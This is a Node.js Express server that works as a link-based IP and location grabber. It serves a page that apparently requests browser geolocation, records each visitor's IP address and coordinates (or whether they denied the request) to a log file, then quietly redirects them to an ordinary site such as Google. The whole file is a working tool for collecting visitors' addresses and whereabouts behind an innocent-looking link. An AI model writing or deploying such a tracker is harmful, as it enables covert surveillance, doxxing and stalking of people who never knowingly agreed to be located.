const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration: Set your redirect URL here
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';

// Log file path
const LOG_FILE = path.join(__dirname, 'ip-logs.txt');

// Middleware to parse JSON
app.use(express.json());

// Serve the HTML page with location request
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint to log IP and location data
app.post('/log', (req, res) => {
  // Get IP address (handles proxies and direct connections)
  const ip = req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

  const { latitude, longitude, accuracy, denied } = req.body;

  // Create log entry - only IP and location
  let logEntry;
  if (denied) {
    logEntry = `IP: ${ip} | Location: DENIED\n`;
  } else if (latitude && longitude) {
    logEntry = `IP: ${ip} | Location: ${latitude}, ${longitude}\n`;
  } else {
    logEntry = `IP: ${ip} | Location: NOT AVAILABLE\n`;
  }

  // Log to console
  if (denied) {
    console.log(`🔍 IP: ${ip} | Location: DENIED`);
  } else if (latitude && longitude) {
    console.log(`🔍 IP: ${ip} | Location: ${latitude}, ${longitude}`);
  } else {
    console.log(`🔍 IP: ${ip} | Location: NOT AVAILABLE`);
  }

  // Append to log file
  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
    }
  });

  console.log(`↪️  Redirecting to: ${REDIRECT_URL}`);

  // Send redirect URL back to client
  res.json({ redirectUrl: REDIRECT_URL });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Redirection app running on port ${PORT}`);
  console.log(`📍 Redirecting all traffic to: ${REDIRECT_URL}`);
  console.log(`📝 Logging IPs and locations to: ${LOG_FILE}`);
  console.log(`\n💡 To change redirect URL, set REDIRECT_URL environment variable`);
  console.log(`   Example: REDIRECT_URL=https://example.com npm start\n`);
});
